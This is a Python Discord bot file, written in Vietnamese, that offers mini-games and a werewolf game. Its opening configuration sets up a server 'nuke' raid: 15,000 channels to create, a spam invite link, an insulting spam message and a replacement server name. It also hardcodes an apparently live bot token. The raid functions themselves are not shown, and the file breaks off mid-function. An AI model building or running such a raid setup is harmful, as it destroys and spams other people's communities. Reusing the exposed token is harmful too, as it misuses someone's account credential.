import discord
from discord import app_commands
import asyncio
import sys
import time
import random
import json
import os
import math

# ===== CẤU HÌNH GỐC (NUKE) =====
TOKEN = "MTU0MjgzNTMxMjY2ODA1NzcwMQ.Gwz2CY.2Wo79QF6ka4Qu8AylW2pQW1A8mH_8EbFTPKtJs" 
OWNER_ID = 1413781843030966345
RAID_NAME = " ҉N҉u҉k҉e҉ ҉D҉i҉s҉c҉o҉r҉d҉ ҉B҉y҉ ҉B҉a҉n҉a҉n҉a҉v҉u҉i҉v҉e҉ "
CHANNEL_COUNT = 15000
BATCH_SIZE = 80
SPAM_LINK = "https://discord.gg/MQ9Zr4H4d"
SPAM_MESSAGE = "***SERVER CỦA CHA NÈ MẤY THẰNG NGU ĐÚ ĐỞN***"
NEW_GUILD_NAME = "👑 𝐍𝐮𝐤𝐞 𝐁𝐲 𝐁𝐚𝐧𝐚𝐧𝐚𝐯𝐮𝐢𝐯𝐞 👑"

# ===== CẤU HÌNH MINI GAME =====
DATA_FILE = "rankings.json"
PLAYERS_FILE = "players.json"
SAVED_INVITE_FILE = "saved_invite.txt"
QUIZ_DURATION = 30
VOTE_DURATION = 10
START_COUNTDOWN = 3
INACTIVITY_TIMEOUT = 60

# ===== QUẢN LÝ NGƯỜI CHƠI =====
def load_players():
    if os.path.exists(PLAYERS_FILE):
        with open(PLAYERS_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    return {}

def save_players(data):
    with open(PLAYERS_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, ensure_ascii=False, indent=4)

def reset_players():
    global players
    players = {}
    save_players(players)

players = load_players()

# ===== LƯU LINK MỜI =====
def load_saved_invite():
    if os.path.exists(SAVED_INVITE_FILE):
        with open(SAVED_INVITE_FILE, "r", encoding="utf-8") as f:
            return f.read().strip()
    return None

def save_saved_invite(link):
    with open(SAVED_INVITE_FILE, "w", encoding="utf-8") as f:
        f.write(link)

saved_invite = load_saved_invite()

# ===== HỆ THỐNG RANK (CHỈ DÙNG EMOJI + MÀU) =====
RANK_COLORS = {
    "Đồng": 0xB87333,
    "Bạc": 0xC0C0C0,
    "Vàng": 0xFFD700,
    "Bạch Kim": 0xE5E4E2,
    "Kim Cương": 0xB9F2FF,
    "Tinh Anh": 0x7B68EE,
    "Cao Thủ": 0xFF4500,
    "Đại Pro": 0x9400D3,
    "Vua": 0xFFD700,
    "Người Giàu": 0x008000,
    "Triệu Phú": 0x1E90FF,
    "Tỉ Phú": 0x8B0000,
    "Siêu Tỉ Phú": 0xFF0000
}

RANK_THRESHOLDS = [
    (0, "Đồng", "🥉"),
    (50, "Bạc", "🥈"),
    (100, "Vàng", "🥇"),
    (200, "Bạch Kim", "🍆"),
    (350, "Kim Cương", "💎"),
    (500, "Tinh Anh", "⚔️"),
    (700, "Cao Thủ", "👑"),
    (1000, "Đại Pro", "🔥"),
    (1500, "Vua", "🌟"),
    (5000, "Người Giàu", "💰"),
    (20000, "Triệu Phú", "💎"),
    (50000, "Tỉ Phú", "👑"),
    (100000, "Siêu Tỉ Phú", "🏆")
]

def get_rank(score):
    rank = "Đồng"
    for threshold, name, emoji in RANK_THRESHOLDS:
        if score >= threshold:
            rank = name
    return rank

def get_rank_emoji(rank):
    for threshold, name, emoji in RANK_THRESHOLDS:
        if name == rank:
            return emoji
    return "⭐"

def get_rank_color(rank):
    return RANK_COLORS.get(rank, 0x5865F2)

# ===== LƯU TRỮ ĐIỂM THEO SERVER =====
def get_rankings(guild_id):
    filename = f"rankings_{guild_id}.json"
    if os.path.exists(filename):
        with open(filename, "r", encoding="utf-8") as f:
            return json.load(f)
    return {}

def save_rankings(guild_id, data):
    filename = f"rankings_{guild_id}.json"
    with open(filename, "w", encoding="utf-8") as f:
        json.dump(data, f, ensure_ascii=False, indent=4)

def add_points(guild_id, user_id, points):
    user_id = str(user_id)
    rankings = get_rankings(guild_id)
    rankings[user_id] = rankings.get(user_id, 0) + points
    save_rankings(guild_id, rankings)
    print(f"[+] Server {guild_id}: Added {points} to {user_id}, new score: {rankings[user_id]}")
    return rankings[user_id]

def get_points(guild_id, user_id):
    rankings = get_rankings(guild_id)
    return rankings.get(str(user_id), 0)

# ===== DANH SÁCH MINI GAME =====
MINI_GAMES = {
    "1": {"name": "🎯 Đoán số", "desc": "Đoán số từ 1-100 trong 5 lần", "emoji": "🎯", "mode": "solo"},
    "2": {"name": "🧠 Đố vui", "desc": "Trả lời câu hỏi trắc nghiệm", "emoji": "🧠", "mode": "solo"},
    "3": {"name": "⚡ Tính nhanh", "desc": "Giải phép toán trong 5 giây", "emoji": "⚡", "mode": "solo"},
    "4": {"name": "🎲 Đỏ đen", "desc": "Cược điểm – Đoán đúng màu (Đỏ/Đen)", "emoji": "🎲", "mode": "solo"},
    "5": {"name": "🎲 Tài xỉu", "desc": "Đoán số xúc xắc (1-6) và cược điểm", "emoji": "🎲", "mode": "solo"},
    "6": {"name": "📝 Điền từ", "desc": "Điền từ đúng vào chỗ trống", "emoji": "📝", "mode": "solo"},
    "7": {"name": "🎵 Đoán bài hát", "desc": "Đoán tên bài hát từ lời", "emoji": "🎵", "mode": "solo"},
    "8": {"name": "🏆 Ai nhanh hơn", "desc": "Trả lời nhanh nhất trong 5 giây", "emoji": "🏆", "mode": "solo"},
    "9": {"name": "🧩 Giải đố", "desc": "Giải câu đố logic", "emoji": "🧩", "mode": "solo"},
    "10": {"name": "💪 Thử thách", "desc": "Hoàn thành thử thách ngẫu nhiên", "emoji": "💪", "mode": "solo"},
    "11": {"name": "⚔️ Đấu team", "desc": "Chia 2 đội đấu với nhau", "emoji": "⚔️", "mode": "team"},
    "12": {"name": "🎖️ Solo đấu", "desc": "1vs1 đấu trí", "emoji": "🎖️", "mode": "solo"},
    "13": {"name": "🏎️ Đua xe", "desc": "Cược điểm – Chọn màu xe chiến thắng", "emoji": "🏎️", "mode": "solo"},
    "14": {"name": "🐺 Ma sói", "desc": "Game nhập vai – phe sói vs dân làng, bot làm quản trò", "emoji": "🐺", "mode": "solo"},
}

# ===== GAME INSTRUCTIONS =====
GAME_INSTRUCTIONS = {
    "1": "🎯 **ĐOÁN SỐ**\nĐoán một số từ 1 đến 100. Bạn có 5 lần thử. Mỗi lần đoán đúng được +10 điểm.",
    "2": "🧠 **ĐỐ VUI**\nTrả lời câu hỏi trắc nghiệm. Chọn đáp án đúng để nhận +10 điểm.",
    "3": "⚡ **TÍNH NHANH**\nGiải phép toán trong 5 giây. Trả lời đúng +10 điểm.",
    "4": "🎲 **ĐỎ ĐEN**\nChọn Đỏ hoặc Đen, cược 10 điểm. Đúng +20, sai -10.",
    "5": "🎲 **TÀI XỈU**\nĐoán số xúc xắc (1-6) và cược điểm. Đúng nhận điểm từ người thua.",
    "6": "📝 **ĐIỀN TỪ**\nĐiền từ đúng vào chỗ trống. Đúng +10 điểm.",
    "7": "🎵 **ĐOÁN BÀI HÁT**\nĐoán tên bài hát từ gợi ý. Đúng +10 điểm.",
    "8": "🏆 **AI NHANH HƠN**\nAi trả lời 'tôi' nhanh nhất sẽ thắng +10 điểm.",
    "9": "🧩 **GIẢI ĐỐ**\nGiải câu đố logic. Đúng +10 điểm.",
    "10": "💪 **THỬ THÁCH**\nHoàn thành thử thách ngẫu nhiên để nhận +10 điểm.",
    "11": "⚔️ **ĐẤU TEAM**\nChia 2 đội, đội nào trả lời đúng trước sẽ thắng.",
    "12": "🎖️ **SOLO ĐẤU**\n1vs1, ai trả lời đúng trước sẽ thắng +15 điểm.",
    "13": "🏎️ **ĐUA XE**\nChọn màu xe và cược điểm. Xe nào về đích trước sẽ thắng.",
    "14": "🐺 **MA SÓI**\nGame nhập vai: phe sói vs dân làng.\nĐiểm thưởng: Dân thắng +30 điểm, Sói thắng +50 điểm.\nVai trò được gửi riêng qua DM.\nCần ít nhất 6 người để bắt đầu."
}

# ===== CLASS MA SÓI =====
class WerewolfGame:
    def __init__(self, channel, player_ids):
        self.channel = channel
        self.player_ids = player_ids
        self.alive = set(player_ids)
        self.roles = {}
        self.role_emoji = {
            "Dân làng": "👤",
            "Ma sói": "🐺",
            "Tiên tri": "🔮",
            "Bảo vệ": "🛡️",
            "Phù thủy": "🧪",
            "Thợ săn": "🏹"
        }
        self.used_abilities = {
            "witch_save": False,
            "witch_kill": False,
            "guardian_target": None,
            "guardian_last": None
        }
        self.night_actions = {}
        self.day_count = 0
        self.game_over = False
        self.winner = None
        self.votes = {}
        self.deaths = []
        self.saved = None

    def assign_roles(self):
        num = len(self.player_ids)
        roles = []
        num_wolves = max(1, num // 3)
        roles.extend(["Ma sói"] * num_wolves)
        remaining = num - num_wolves
        
        if num >= 6:
            roles.append("Tiên tri")
            remaining -= 1
        if num >= 7:
            roles.append("Bảo vệ")
            remaining -= 1
        if num >= 8:
            roles.append("Phù thủy")
            remaining -= 1
        if num >= 9:
            roles.append("Thợ săn")
            remaining -= 1
        
        roles.extend(["Dân làng"] * remaining)
        random.shuffle(roles)
        
        for i, user_id in enumerate(self.player_ids):
            self.roles[user_id] = roles[i]
        
        return self.roles

    def get_alive_players(self):
        return [uid for uid in self.alive]

    def get_alive_names(self, guild):
        names = []
        for uid in self.alive:
            try:
                member = guild.get_member(int(uid))
                names.append(member.display_name if member else uid)
            except:
                names.append(uid)
        return names

    def get_player_name(self, uid, guild):
        try:
            member = guild.get_member(int(uid))
            return member.display_name if member else uid
        except:
            return uid

    def is_game_over(self):
        alive_players = self.get_alive_players()
        wolves = [uid for uid in alive_players if self.roles[uid] == "Ma sói"]
        villagers = [uid for uid in alive_players if self.roles[uid] != "Ma sói"]
        
        if len(wolves) == 0:
            self.winner = "Dân làng"
            return True
        if len(wolves) >= len(villagers):
            self.winner = "Ma sói"
            return True
        return False

    def get_wolf_ids(self):
        return [uid for uid in self.roles if self.roles[uid] == "Ma sói" and uid in self.alive]

# ===== HÀM CHẠY GAME MA SÓI =====
async def run_werewolf(channel):
    global players
    
    if len(players) < 6:
        await channel.send("❌ **Cần ít nhất 6 người để chơi Ma sói!** Hiện có {} người.".format(len(players)))
        return
    
    player_ids = list(players.keys())
    game = WerewolfGame(channel, player_ids)
    game.assign_roles()
    
    await channel.send("🐺 **MA SÓI BẮT ĐẦU!**\nBot đang phân vai... Mỗi người sẽ nhận được DM riêng.")
    
    for uid in player_ids:
        try:
            user = await channel.guild.fetch_member(int(uid))
            if user:
                role = game.roles[uid]
                emoji = game.role_emoji.get(role, "❓")
                embed = discord.Embed(
                    title="🐺 VAI TRÒ CỦA BẠN",
                    description=f"{emoji} **{role}**",
                    color=discord.Color.purple()
                )
                if role == "Ma sói":
                    embed.add_field(name="Kỹ năng", value="Mỗi đêm cắn 1 người. Chat riêng với sói khác.", inline=False)
                elif role == "Tiên tri":
                    embed.add_field(name="Kỹ năng", value="Mỗi đêm soi 1 người biết vai trò.", inline=False)
                elif role == "Bảo vệ":
                    embed.add_field(name="Kỹ năng", value="Mỗi đêm bảo vệ 1 người (không trùng 2 đêm).", inline=False)
                elif role == "Phù thủy":
                    embed.add_field(name="Kỹ năng", value="1 lần cứu + 1 lần giết (dùng trong đêm).", inline=False)
                elif role == "Thợ săn":
                    embed.add_field(name="Kỹ năng", value="Khi chết được bắn 1 người.", inline=False)
                else:
                    embed.add_field(name="Kỹ năng", value="Không có. Thảo luận và vote treo cổ.", inline=False)
                embed.add_field(name="Điểm thưởng", value="Dân thắng: +30 điểm\nSói thắng: +50 điểm", inline=False)
                embed.set_footer(text="Đừng tiết lộ vai trò cho người khác!")
                await user.send(embed=embed)
        except:
            pass
    
    await channel.send("✅ **Đã gửi vai trò cho tất cả người chơi qua DM.**\nBắt đầu game sau 3 giây...")
    await asyncio.sleep(3)
    
    while not game.game_over:
        await channel.send("🌙 **ĐÊM XUỐNG...**\nMọi người đừng nói chuyện. Các vai đặc biệt hãy kiểm tra DM.")
        
        game.night_actions = {}
        game.votes = {}
        game.deaths = []
        game.saved = None
        
        wolves = game.get_wolf_ids()
        wolf_target = None
        if wolves:
            wolf_votes = {}
            for wid in wolves:
                try:
                    user = await channel.guild.fetch_member(int(wid))
                    if user:
                        class WolfView(discord.ui.View):
                            def __init__(self, alive_players, game, guild):
                                super().__init__(timeout=20)
                                self.alive = alive_players
                                self.game = game
                                self.guild = guild
                                self.chosen = None
                                for uid in alive_players:
                                    if uid != wid and uid in game.alive:
                                        name = game.get_player_name(uid, guild)
                                        btn = discord.ui.Button(label=name, custom_id=f"wolf_{uid}", style=discord.ButtonStyle.danger)
                                        btn.callback = self.btn_callback
                                        self.add_item(btn)
                            async def btn_callback(self, interaction: discord.Interaction):
                                if interaction.user.id != int(wid):
                                    await interaction.response.send_message("❌ Không phải lượt của bạn!", ephemeral=True)
                                    return
                                self.chosen = interaction.data["custom_id"].split("_")[1]
                                self.stop()
                                await interaction.response.send_message(f"✅ Đã chọn **{self.game.get_player_name(self.chosen, self.guild)}**", ephemeral=True)
                        
                        view = WolfView([uid for uid in game.alive if uid != wid], game, channel.guild)
                        await user.send("🐺 **Chọn 1 người để cắn đêm nay:**", view=view)
                        await view.wait()
                        if view.chosen:
                            wolf_votes[wid] = view.chosen
                except:
                    pass
            
            if wolf_votes:
                vote_count = {}
                for target in wolf_votes.values():
                    vote_count[target] = vote_count.get(target, 0) + 1
                if vote_count:
                    wolf_target = max(vote_count, key=vote_count.get)
        
        seers = [uid for uid in game.alive if game.roles[uid] == "Tiên tri"]
        seer_target = None
        if seers:
            seer = seers[0]
            try:
                user = await channel.guild.fetch_member(int(seer))
                if user:
                    class SeerView(discord.ui.View):
                        def __init__(self, alive_players, game, guild):
                            super().__init__(timeout=15)
                            self.alive = alive_players
                            self.game = game
                            self.guild = guild
                            self.chosen = None
                            for uid in alive_players:
                                if uid != seer:
                                    name = game.get_player_name(uid, guild)
                                    btn = discord.ui.Button(label=name, custom_id=f"seer_{uid}", style=discord.ButtonStyle.primary)
                                    btn.callback = self.btn_callback
                                    self.add_item(btn)
                        async def btn_callback(self, interaction: discord.Interaction):
                            if interaction.user.id != int(seer):
                                await interaction.response.send_message("❌ Không phải lượt của bạn!", ephemeral=True)
                                return
                            self.chosen = interaction.data["custom_id"].split("_")[1]
                            self.stop()
                            await interaction.response.send_message(f"✅ Đã soi **{self.game.get_player_name(self.chosen, self.guild)}**", ephemeral=True)
                    
                    view = SeerView([uid for uid in game.alive if uid != seer], game, channel.guild)
                    await user.send("🔮 **Chọn 1 người để soi:**", view=view)
                    await view.wait()
                    if view.chosen:
                        seer_target = view.chosen
                        target_role = game.roles[seer_target]
                        is_wolf = "🐺 **Ma sói**" if target_role == "Ma sói" else f"👤 **{target_role}**"
                        await user.send(f"🔮 Kết quả: {game.get_player_name(seer_target, channel.guild)} là {is_wolf}")
            except:
                pass
        
        guardians = [uid for uid in game.alive if game.roles[uid] == "Bảo vệ"]
        guardian_target = None
        if guardians:
            guardian = guardians[0]
            try:
                user = await channel.guild.fetch_member(int(guardian))
                if user:
                    class GuardianView(discord.ui.View):
                        def __init__(self, alive_players, game, guild, last_target):
                            super().__init__(timeout=15)
                            self.alive = alive_players
                            self.game = game
                            self.guild = guild
                            self.last_target = last_target
                            self.chosen = None
                            for uid in alive_players:
                                if uid != guardian and uid != last_target:
                                    name = game.get_player_name(uid, guild)
                                    btn = discord.ui.Button(label=name, custom_id=f"guard_{uid}", style=discord.ButtonStyle.success)
                                    btn.callback = self.btn_callback
                                    self.add_item(btn)
                        async def btn_callback(self, interaction: discord.Interaction):
                            if interaction.user.id != int(guardian):
                                await interaction.response.send_message("❌ Không phải lượt của bạn!", ephemeral=True)
                                return
                            self.chosen = interaction.data["custom_id"].split("_")[1]
                            self.stop()
                            await interaction.response.send_message(f"✅ Đã bảo vệ **{self.game.get_player_name(self.chosen, self.guild)}**", ephemeral=True)
                    
                    view = GuardianView([uid for uid in game.alive if uid != guardian], game, channel.guild, game.used_abilities.get("guardian_last"))
                    await user.send("🛡️ **Chọn 1 người để bảo vệ đêm nay:**", view=view)
                    await view.wait()
                    if view.chosen:
                        guardian_target = view.chosen
                        game.used_abilities["guardian_last"] = guardian_target
            except:
                pass
        
        if wolf_target and wolf_target in game.alive:
            if guardian_target == wolf_target:
                await channel.send("🛡️ **Bảo vệ đã cứu 1 người!**")
            else:
                game.deaths.append(wolf_target)
        
        witches = [uid for uid in game.alive if game.roles[uid] == "Phù thủy"]
        if witches and game.deaths and not game.used_abilities["witch_save"]:
            witch = witches[0]
            try:
                user = await channel.guild.fetch_member(int(witch))
                if user:
                    class WitchSaveView(discord.ui.View):
                        def __init__(self, victim_name):
                            super().__init__(timeout=10)
                            self.chosen = None
                            btn_yes = discord.ui.Button(label="✅ Cứu", style=discord.ButtonStyle.success, custom_id="save_yes")
                            btn_no = discord.ui.Button(label="❌ Không", style=discord.ButtonStyle.danger, custom_id="save_no")
                            btn_yes.callback = self.btn_callback
                            btn_no.callback = self.btn_callback
                            self.add_item(btn_yes)
                            self.add_item(btn_no)
                            self.victim_name = victim_name
                        async def btn_callback(self, interaction: discord.Interaction):
                            if interaction.user.id != int(witch):
                                await interaction.response.send_message("❌ Không phải lượt của bạn!", ephemeral=True)
                                return
                            self.chosen = interaction.data["custom_id"].split("_")[1]
                            self.stop()
                            await interaction.response.send_message(f"✅ Đã chọn {self.chosen.upper()}", ephemeral=True)
                    
                    victim_name = game.get_player_name(game.deaths[0], channel.guild)
                    view = WitchSaveView(victim_name)
                    await user.send(f"🧪 **{victim_name}** bị cắn. Dùng bình cứu?", view=view)
                    await view.wait()
                    if view.chosen == "yes":
                        game.used_abilities["witch_save"] = True
                        game.saved = game.deaths[0]
                        game.deaths.remove(game.deaths[0])
                        await user.send("✅ Đã dùng bình cứu!")
            except:
                pass
        
        if witches and not game.used_abilities["witch_kill"]:
            witch = witches[0]
            try:
                user = await channel.guild.fetch_member(int(witch))
                if user:
                    class WitchKillView(discord.ui.View):
                        def __init__(self, alive_players, game, guild):
                            super().__init__(timeout=10)
                            self.alive = alive_players
                            self.game = game
                            self.guild = guild
                            self.chosen = None
                            btn_cancel = discord.ui.Button(label="❌ Hủy", style=discord.ButtonStyle.secondary, custom_id="kill_cancel")
                            btn_cancel.callback = self.btn_callback
                            self.add_item(btn_cancel)
                            for uid in alive_players:
                                if uid != witch:
                                    name = game.get_player_name(uid, guild)
                                    btn = discord.ui.Button(label=name, custom_id=f"kill_{uid}", style=discord.ButtonStyle.danger)
                                    btn.callback = self.btn_callback
                                    self.add_item(btn)
                        async def btn_callback(self, interaction: discord.Interaction):
                            if interaction.user.id != int(witch):
                                await interaction.response.send_message("❌ Không phải lượt của bạn!", ephemeral=True)
                                return
                            self.chosen = interaction.data["custom_id"].split("_")[1]
                            self.stop()
                            await interaction.response.send_message(f"✅ Đã chọn", ephemeral=True)
                    
                    view = WitchKillView([uid for uid in game.alive if uid != witch], game, channel.guild)
                    await user.send("🧪 **Chọn 1 người để đầu độc (hoặc Hủy):**", view=view)
                    await view.wait()
                    if view.chosen and view.chosen != "cancel":
                        target = view.chosen
                        if target in game.alive:
                            game.used_abilities["witch_kill"] = True
                            if target not in game.deaths:
                                game.deaths.append(target)
                            await user.send(f"✅ Đã đầu độc {game.get_player_name(target, channel.guild)}")
            except:
                pass
        
        if game.deaths:
            death_names = [game.get_player_name(uid, channel.guild) for uid in game.deaths]
            await channel.send(f"💀 **SÁNG HÔM SAU**\nCó người đã chết: **{', '.join(death_names)}**")
            for uid in game.deaths:
                if uid in game.alive:
                    game.alive.remove(uid)
        else:
            await channel.send("🌅 **SÁNG HÔM SAU**\nKhông có ai chết đêm nay!")
        
        if game.is_game_over():
            break
        
        game.day_count += 1
        await channel.send(f"☀️ **NGÀY {game.day_count}**\nMọi người thảo luận và bỏ phiếu treo cổ.")
        
        await channel.send("💬 **Thảo luận trong 30 giây...**")
        await asyncio.sleep(30)
        
        alive_list = list(game.alive)
        if len(alive_list) < 2:
            await channel.send("❌ Không đủ người để vote!")
            break
        
        class HangView(discord.ui.View):
            def __init__(self, alive_players, game, guild):
                super().__init__(timeout=30)
                self.alive = alive_players
                self.game = game
                self.guild = guild
                self.votes = {}
                for uid in alive_players:
                    name = game.get_player_name(uid, guild)
                    btn = discord.ui.Button(label=name, custom_id=f"hang_{uid}", style=discord.ButtonStyle.secondary)
                    btn.callback = self.btn_callback
                    self.add_item(btn)
            async def btn_callback(self, interaction: discord.Interaction):
                voter_id = str(interaction.user.id)
                if voter_id not in self.alive:
                    await interaction.response.send_message("❌ Bạn đã chết hoặc không phải người chơi!", ephemeral=True)
                    return
                if voter_id in self.votes:
                    await interaction.response.send_message("❌ Bạn đã bỏ phiếu rồi!", ephemeral=True)
                    return
                target = interaction.data["custom_id"].split("_")[1]
                if target not in self.alive:
                    await interaction.response.send_message("❌ Người này đã chết!", ephemeral=True)
                    return
                self.votes[voter_id] = target
                await interaction.response.send_message(f"✅ Đã vote **{self.game.get_player_name(target, self.guild)}**", ephemeral=True)
        
        hang_view = HangView(alive_list, game, channel.guild)
        await channel.send("🗳️ **Bỏ phiếu treo cổ (30 giây):**", view=hang_view)
        await hang_view.wait()
        
        if hang_view.votes:
            vote_count = {}
            for target in hang_view.votes.values():
                vote_count[target] = vote_count.get(target, 0) + 1
            if vote_count:
                max_votes = max(vote_count.values())
                top_voted = [uid for uid, count in vote_count.items() if count == max_votes]
                if top_voted:
                    hanged = random.choice(top_voted)
                    await channel.send(f"⚖️ **KẾT QUẢ**\n**{game.get_player_name(hanged, channel.guild)}** bị treo cổ với {max_votes} phiếu!")
                    if hanged in game.alive:
                        game.alive.remove(hanged)
                        
                        if game.roles[hanged] == "Thợ săn":
                            hunter = hanged
                            try:
                                user = await channel.guild.fetch_member(int(hunter))
                                if user:
                                    class HunterView(discord.ui.View):
                                        def __init__(self, alive_players, game, guild):
                                            super().__init__(timeout=15)
                                            self.alive = alive_players
                                            self.game = game
                                            self.guild = guild
                                            self.chosen = None
                                            for uid in alive_players:
                                                if uid != hunter:
                                                    name = game.get_player_name(uid, guild)
                                                    btn = discord.ui.Button(label=name, custom_id=f"hunt_{uid}", style=discord.ButtonStyle.danger)
                                                    btn.callback = self.btn_callback
                                                    self.add_item(btn)
                                        async def btn_callback(self, interaction: discord.Interaction):
                                            if interaction.user.id != int(hunter):
                                                await interaction.response.send_message("❌ Không phải lượt của bạn!", ephemeral=True)
                                                return
                                            self.chosen = interaction.data["custom_id"].split("_")[1]
                                            self.stop()
                                            await interaction.response.send_message(f"✅ Đã chọn", ephemeral=True)
                                    
                                    alive_for_hunter = [uid for uid in game.alive if uid != hunter]
                                    if alive_for_hunter:
                                        view = HunterView(alive_for_hunter, game, channel.guild)
                                        await user.send("🏹 **Bạn bị treo cổ! Chọn 1 người để bắn:**", view=view)
                                        await view.wait()
                                        if view.chosen:
                                            target = view.chosen
                                            if target in game.alive:
                                                game.alive.remove(target)
                                                await channel.send(f"🏹 **{game.get_player_name(target, channel.guild)}** bị Thợ săn bắn chết!")
                            except:
                                pass
        else:
            await channel.send("⏰ **Không có ai bỏ phiếu! Không ai bị treo cổ.**")
        
        if game.is_game_over():
            break
    
    await channel.send(f"🎉 **GAME KẾT THÚC!**\n🏆 Phe **{game.winner}** chiến thắng!")
    
    guild_id = str(channel.guild.id)
    if game.winner == "Dân làng":
        for uid in game.alive:
            if game.roles[uid] != "Ma sói":
                new_score = add_points(guild_id, uid, 30)
                try:
                    user = await channel.guild.fetch_member(int(uid))
                    if user:
                        await user.send(f"🎉 Bạn thắng với phe Dân làng! +30 điểm. Tổng: {new_score}")
                except:
                    pass
    elif game.winner == "Ma sói":
        for uid in game.alive:
            if game.roles[uid] == "Ma sói":
                new_score = add_points(guild_id, uid, 50)
                try:
                    user = await channel.guild.fetch_member(int(uid))
                    if user:
                        await user.send(f"🎉 Bạn thắng với phe Ma sói! +50 điểm. Tổng: {new_score}")
                except:
                    pass
    
    reset_players()

# ===== VOTE MINI GAME =====
class VoteView(discord.ui.View):
    def __init__(self, games):
        super().__init__(timeout=VOTE_DURATION)
        self.votes = {}
        self.games = games
        for game_id, game in games.items():
            btn = discord.ui.Button(label=f"{game['emoji']} {game['name']}", custom_id=f"vote_{game_id}", style=discord.ButtonStyle.secondary)
            btn.callback = self.vote_callback
            self.add_item(btn)
    
    async def vote_callback(self, interaction: discord.Interaction):
        game_id = interaction.data["custom_id"].split("_")[1]
        user_id = str(interaction.user.id)
        if user_id not in self.votes:
            self.votes[user_id] = game_id
            await interaction.response.send_message(f"✅ Bạn đã chọn **{self.games[game_id]['name']}**!", ephemeral=True)
        else:
            await interaction.response.send_message("❌ Bạn đã bỏ phiếu rồi!", ephemeral=True)
    
    async def on_timeout(self):
        self.stop()

# ===== LỚP CONTINUE (TIẾP TỤC SAU GAME) =====
class ContinueView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=5)
        self.value = None
    
    @discord.ui.button(label="🔄 Tiếp tục chơi (5s)", style=discord.ButtonStyle.success, custom_id="continue_yes")
    async def continue_yes(self, interaction: discord.Interaction, button: discord.ui.Button):
        self.value = True
        self.stop()
        await interaction.response.edit_message(content="🔄 **Chọn tiếp tục!** Quay lại màn hình vote...")
    
    @discord.ui.button(label="⏹️ Dừng lại", style=discord.ButtonStyle.danger, custom_id="continue_no")
    async def continue_no(self, interaction: discord.Interaction, button: discord.ui.Button):
        self.value = False
        self.stop()
        await interaction.response.edit_message(content="⏹️ **Đã dừng chơi!** Cảm ơn bạn đã tham gia!")
    
    async def on_timeout(self):
        if self.value is None:
            self.value = False
        self.stop()

# ===== LỚP START =====
class StartView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=INACTIVITY_TIMEOUT)
        self.add_item(discord.ui.Button(label="🎮 Tham gia ngay!", style=discord.ButtonStyle.success, custom_id="join_start"))
        self.add_item(discord.ui.Button(label="▶️ Bắt đầu game!", style=discord.ButtonStyle.primary, custom_id="start_game"))

# ===== BIẾN ĐIỀU KHIỂN VÒNG LẶP =====
keep_playing = True

# ===== HÀM CHẠY MINI GAME =====
async def run_mini_game(channel, game_id):
    global keep_playing
    game = MINI_GAMES[game_id]
    game_name = game['name']
    
    if game_id == "1":
        await game_guess_number(channel)
    elif game_id == "2":
        await game_quiz(channel)
    elif game_id == "3":
        await game_math_fast(channel)
    elif game_id == "4":
        await game_red_black(channel)
    elif game_id == "5":
        await game_tai_xiu(channel)
    elif game_id == "6":
        await game_fill_word(channel)
    elif game_id == "7":
        await game_guess_song(channel)
    elif game_id == "8":
        await game_quick_respond(channel)
    elif game_id == "9":
        await game_puzzle(channel)
    elif game_id == "10":
        await game_challenge(channel)
    elif game_id == "12":
        await game_solo_duel(channel)
    elif game_id == "13":
        await game_race(channel)
    elif game_id == "14":
        await run_werewolf(channel)
    
    reset_players()
    
    embed_continue = discord.Embed(
        title="🎉 GAME ĐÃ KẾT THÚC! 🎉",
        description=f"**{game_name}** đã hoàn thành!\n\n👑 Người chiến thắng đã được vinh danh!\n\nBạn có muốn chơi tiếp không?",
        color=discord.Color.gold()
    )
    embed_continue.add_field(
        name="🔄 Tiếp tục chơi",
        value="Quay lại màn hình vote và chọn game mới",
        inline=True
    )
    embed_continue.add_field(
        name="⏹️ Dừng lại",
        value="Kết thúc phiên chơi, thoát về kênh",
        inline=True
    )
    
    view = ContinueView()
    await channel.send(embed=embed_continue, view=view)
    await view.wait()
    
    if view.value is None:
        view.value = False
    
    if view.value:
        await channel.send("🔄 **Tiếp tục chơi!** Bắt đầu vote sau 3 giây...")
        await asyncio.sleep(3)
        
        embed_vote = discord.Embed(
            title="🎮 **CHỌN MINI GAME** 🎮",
            description=f"Bấm nút bên dưới để bỏ phiếu chọn game.\n⏳ Thời gian còn lại: **{VOTE_DURATION}s**\n🏆 Game có số phiếu cao nhất sẽ được chọn!",
            color=discord.Color.blue()
        )
        for gid, g in MINI_GAMES.items():
            embed_vote.add_field(name=f"{g['emoji']} {g['name']}", value=g['desc'], inline=False)

        view_vote = VoteView(MINI_GAMES)
        vote_msg = await channel.send(embed=embed_vote, view=view_vote)
        
        for remaining in range(VOTE_DURATION, 0, -1):
            embed_vote.description = (
                f"Bấm nút bên dưới để bỏ phiếu chọn game.\n"
                f"⏳ Thời gian còn lại: **{remaining}s**\n"
                "🏆 Game có số phiếu cao nhất sẽ được chọn!"
            )
            await vote_msg.edit(embed=embed_vote)
            await asyncio.sleep(1)

        embed_vote.description = (
            f"Bấm nút bên dưới để bỏ phiếu chọn game.\n"
            f"⏳ Thời gian còn lại: **0s**\n"
            "🏆 Game có số phiếu cao nhất sẽ được chọn!"
        )
        await vote_msg.edit(embed=embed_vote)
        await asyncio.sleep(0.5)

        if not view_vote.votes:
            await channel.send("❌ Không có ai bỏ phiếu! Kết thúc phiên chơi.")
            keep_playing = False
            return

        vote_counts = {}
        for gid in view_vote.votes.values():
            vote_counts[gid] = vote_counts.get(gid, 0) + 1

        max_votes = max(vote_counts.values())
        top_games = [gid for gid, count in vote_counts.items() if count == max_votes]
        chosen_id = random.choice(top_games)
        chosen_game = MINI_GAMES[chosen_id]

        embed_result = discord.Embed(
            title="🎉 **GAME ĐƯỢC CHỌN** 🎉",
            description=f"**{chosen_game['emoji']} {chosen_game['name']}**\n"
                        f"📖 {chosen_game['desc']}\n"
                        f"🗳️ Số phiếu: **{max_votes}**",
            color=discord.Color.gold()
        )
        await channel.send(embed=embed_result)

        if chosen_id in GAME_INSTRUCTIONS:
            await channel.send(GAME_INSTRUCTIONS[chosen_id])

        if chosen_game['mode'] == "team":
            await run_team_game(channel, chosen_id)
        else:
            await run_mini_game(channel, chosen_id)
    else:
        await channel.send("⏹️ **Đã dừng chơi!** Cảm ơn các bạn đã tham gia! 🎮")
        keep_playing = False

# ===== HÀM CHẠY TEAM GAME =====
async def run_team_game(channel, game_id):
    global keep_playing
    if game_id == "11":
